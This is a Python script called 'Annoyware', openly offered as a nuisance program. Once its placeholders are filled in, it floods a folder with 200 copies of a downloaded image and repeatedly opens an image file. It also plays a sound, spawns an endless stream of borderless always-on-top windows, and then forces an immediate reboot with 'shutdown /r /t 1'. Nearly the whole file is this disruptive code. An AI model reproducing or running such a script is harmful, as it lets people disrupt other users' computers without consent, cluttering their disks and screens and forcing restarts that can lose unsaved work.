#Annoyware, Made by Houman Hafez (SpecialSpicy) 
# Note! This Application needs to be edited, in order for it to work!
# Please do not use this in wrong environments!
# Do not use this if you don't know what you're doing!

'''Imports  (requests to send a download request)
            (threading to start multiple functions at the same time [Although Multiprocessing is more recommended])
            (tkinter for the gui)
            (random for the gui box positions)
            (webbrowser in order to open a webpage)
            (playsound to play a certain link's mp3 file)
            (time for the restart function)
            (os for the restart function and startfile to open a certain file)'''
import requests
import threading 
from tkinter import *
from random import *
import webbrowser
import playsound
import time
import os
from os import startfile



#A function to download an amount (here it's 200) of pictures and rename them in order to have 200 of the same picture in a folder 
def Pictures():
    #webpage url as a variable (insert the picture link down below)
    url0 = 'url'
    #a variable that sends a request to the webpage
    r0 = requests.get(url0, allow_redirects=True)  
    #a for loop to download the pictures to the folder and rename them each with a number from 0 to 200
    for i in range(0, 200):
        open(f'Picture_{str(i)}.png' , 'wb').write(r0.content)

#A function to restart the computer 
def restart():
    
    return os.system("shutdown /r /t 1")

#A function to open a number of png files (in this case it's 10)
def pics():
    #change the value '10' to a different value if you'd like to 
    for i in range(0,10):
        startfile('image.png')

#A function to play a certain mp3 sound from a webpage
def PlaySound():
    #change the word "sound" to a url sorrounded by the quotation marks
    playsound.playsound("sound", True)

#a tk GUI Initiation
root = Tk()
root.attributes("-alpha", 0)
root.overrideredirect(1)
root.attributes("-topmost", 1)

#A function for the GUI Box
def Box():
    
    #A while loop to make the boxes appear continuously
    while True:
        #sets the transparency level of the root window to transparent
        root.attributes("-alpha", 0)
        #removes the title bar and borders of the root window
        root.overrideredirect(1)
        #sets the root window to always stay on top of other windows
        root.attributes("-topmost", 1)
        #creates a new top-level window
        win = Toplevel(root)
        #sets the size and position of the new window and its position is randomly generated within the bounds of the screen
        win.geometry("300x60+" + str(randint(0, root.winfo_screenwidth() - 300)) + "+" + str(randint(0,root.winfo_screenheight() - 60)))
        #removes the title bar and borders of the root window
        win.overrideredirect(1)
        #creates a label widget with the text "Box" and a red foreground color, using relative coordinates, it positions it within the window
        Label(win, text="Box", fg="red").place(relx=.38, rely=.3)
        #brings the win window to the front of the window stack
        win.lift()
        #temporarily sets the win windows to always stay on top of other windows
        win.attributes("-topmost", True)
        win.attributes("-topmost", False)
        #brings the root window to the front of the window stack
        root.lift()
        #temporarily sets the root windows to always stay on top of other windows
        root.attributes("-topmost", True)
        root.attributes("-topmost", False)
        

#these lines start each function at the same time
threading.Thread(target=Pictures).start()
threading.Thread(target=PlaySound).start()
threading.Thread(target=Box).start()
threading.Thread(target=pics).start()
#this line is needed to start an event loop of the tkinter gui 
root.mainloop()
#time is stopped for 10 seconds and then the restart function is activated 
time.sleep(10)
threading.Thread(target=restart).start()

